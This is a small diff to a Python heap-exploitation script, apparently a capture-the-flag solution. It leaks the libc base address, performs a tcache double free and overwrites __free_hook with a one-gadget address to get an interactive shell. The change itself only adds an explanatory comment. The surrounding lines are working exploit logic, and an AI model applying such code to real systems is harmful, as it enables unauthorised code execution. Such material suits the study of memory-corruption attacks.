@@ -50,7 +50,7 @@ def main():
     libc_base_address = leak_libc_base_address(primitives)
 
     double_free_tcache(primitives)
-    write_what_where(primitives, libc_base_address + libc.symbols['__free_hook'], p64(libc_base_address + 0xe237f))
+    write_what_where(primitives, libc_base_address + libc.symbols['__free_hook'], p64(libc_base_address + 0xe237f))  # one gadget
 
     primitives.remove_note()
     primitives.conn.interactive('')
